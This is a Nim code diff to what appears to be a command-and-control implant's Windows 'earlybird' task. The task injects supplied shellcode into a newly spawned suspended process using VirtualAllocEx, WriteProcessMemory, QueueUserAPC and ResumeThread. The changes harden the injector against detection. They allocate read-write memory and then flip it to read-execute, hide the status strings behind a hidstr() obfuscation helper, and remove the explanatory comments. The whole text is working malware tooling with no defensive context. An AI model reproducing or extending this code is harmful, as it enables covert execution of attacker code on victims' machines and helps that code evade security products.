@@ -46,10 +46,11 @@ when defined(windows):
       dwThreadId:  DWORD
 
   const
-    CREATE_SUSPENDED       = DWORD(0x00000004)
-    MEM_COMMIT             = DWORD(0x00001000)
-    MEM_RESERVE            = DWORD(0x00002000)
-    PAGE_EXECUTE_READWRITE = DWORD(0x40)
+    CREATE_SUSPENDED   = DWORD(0x00000004)
+    MEM_COMMIT         = DWORD(0x00001000)
+    MEM_RESERVE        = DWORD(0x00002000)
+    PAGE_READWRITE     = DWORD(0x04)
+    PAGE_EXECUTE_READ  = DWORD(0x20)
 
   # ---------------------------------------------------------------------------
   # Windows API imports
@@ -83,6 +84,14 @@ when defined(windows):
     lpNumberOfBytesWritten:  ptr SIZE_T
   ): BOOL {.importc: "WriteProcessMemory", dynlib: "kernel32".}
 
+  proc VirtualProtectEx(
+    hProcess:    HANDLE,
+    lpAddress:   LPVOID,
+    dwSize:      SIZE_T,
+    flNewProtect: DWORD,
+    lpflOldProtect: ptr DWORD
+  ): BOOL {.importc: "VirtualProtectEx", dynlib: "kernel32".}
+
   proc QueueUserAPC(
     pfnAPC:  LPVOID,
     hThread: HANDLE,
@@ -100,20 +109,19 @@ when defined(windows):
 proc earlybirdExecute(taskId: string, params: JsonNode, state: AgentState,
                       send: SendMsg): TaskResult =
   when not defined(windows):
-    return TaskResult(output: "earlybird is Windows-only", status: "error",
+    return TaskResult(output: hidstr("earlybird is Windows-only"), status: "error",
                       completed: true)
   else:
     let processPath  = params{"process"}.getStr("")
     let shellcodeB64 = params{"shellcode"}.getStr("")
 
     if processPath.len == 0:
-      return TaskResult(output: "Error: process parameter required",
+      return TaskResult(output: hidstr("Error: process parameter required"),
                         status: "error", completed: true)
     if shellcodeB64.len == 0:
-      return TaskResult(output: "Error: shellcode parameter required",
+      return TaskResult(output: hidstr("Error: shellcode parameter required"),
                         status: "error", completed: true)
 
-    # Decode shellcode
     var shellcode: seq[byte]
     try:
       let decoded = decode(shellcodeB64)
@@ -121,79 +129,69 @@ proc earlybirdExecute(taskId: string, params: JsonNode, state: AgentState,
       for i, c in decoded:
         shellcode[i] = byte(ord(c))
     except Exception as e:
-      return TaskResult(output: "Error decoding shellcode: " & e.msg,
+      return TaskResult(output: hidstr("Error decoding shellcode: ") & e.msg,
                         status: "error", completed: true)
 
     if shellcode.len == 0:
-      return TaskResult(output: "Error: empty shellcode after decode",
+      return TaskResult(output: hidstr("Error: empty shellcode after decode"),
                         status: "error", completed: true)
 
     var si: STARTUPINFOA
     var pi: PROCESS_INFORMATION
     si.cb = DWORD(sizeof(STARTUPINFOA))
 
-    # 1. Spawn target process in suspended state
     let created = CreateProcessA(
-      nil,
-      processPath.cstring,
-      nil, nil,
-      BOOL(0),
-      CREATE_SUSPENDED,
-      nil, nil,
-      addr si,
-      addr pi
+      nil, processPath.cstring, nil, nil, BOOL(0),
+      CREATE_SUSPENDED, nil, nil, addr si, addr pi
     )
     if created == 0:
       return TaskResult(
-        output: "Error: CreateProcessA failed for '" & processPath & "'",
+        output: hidstr("Error: CreateProcessA failed"),
         status: "error", completed: true)
 
-    # 2. Allocate RWX memory in target process
+    # RW alloc, write shellcode, then flip to RX (never RWX)
     let remoteMem = VirtualAllocEx(
-      pi.hProcess,
-      nil,
-      SIZE_T(shellcode.len),
-      MEM_COMMIT or MEM_RESERVE,
-      PAGE_EXECUTE_READWRITE
+      pi.hProcess, nil, SIZE_T(shellcode.len),
+      MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE
     )
     if remoteMem == nil:
       discard CloseHandle(pi.hThread)
       discard CloseHandle(pi.hProcess)
-      return TaskResult(output: "Error: VirtualAllocEx failed",
+      return TaskResult(output: hidstr("Error: VirtualAllocEx failed"),
                         status: "error", completed: true)
 
-    # 3. Write shellcode into target
     var bytesWritten: SIZE_T = 0
     let written = WriteProcessMemory(
-      pi.hProcess,
-      remoteMem,
-      addr shellcode[0],
-      SIZE_T(shellcode.len),
-      addr bytesWritten
+      pi.hProcess, remoteMem, addr shellcode[0],
+      SIZE_T(shellcode.len), addr bytesWritten
     )
     if written == 0:
       discard CloseHandle(pi.hThread)
       discard CloseHandle(pi.hProcess)
-      return TaskResult(output: "Error: WriteProcessMemory failed",
+      return TaskResult(output: hidstr("Error: WriteProcessMemory failed"),
                         status: "error", completed: true)
 
-    # 4. Queue APC pointing to shellcode on the main (suspended) thread
+    var oldProt: DWORD = 0
+    if VirtualProtectEx(pi.hProcess, remoteMem, SIZE_T(shellcode.len),
+                        PAGE_EXECUTE_READ, addr oldProt) == 0:
+      discard CloseHandle(pi.hThread)
+      discard CloseHandle(pi.hProcess)
+      return TaskResult(output: hidstr("Error: VirtualProtectEx failed"),
+                        status: "error", completed: true)
+
     let apcQueued = QueueUserAPC(remoteMem, pi.hThread, ULONG_PTR(0))
     if apcQueued == 0:
       discard CloseHandle(pi.hThread)
       discard CloseHandle(pi.hProcess)
-      return TaskResult(output: "Error: QueueUserAPC failed",
+      return TaskResult(output: hidstr("Error: QueueUserAPC failed"),
                         status: "error", completed: true)
 
-    # 5. Resume — shellcode runs before entry point (Early Bird)
     discard ResumeThread(pi.hThread)
-
     discard CloseHandle(pi.hThread)
     discard CloseHandle(pi.hProcess)
 
     return TaskResult(
-      output:    "Early Bird injection complete — PID " & $pi.dwProcessId &
-                 " (" & processPath & "), " & $shellcode.len & " bytes",
+      output:    hidstr("Injected ") & $shellcode.len & hidstr(" bytes into PID ") & $pi.dwProcessId,
       status:    "success",
       completed: true,
     )
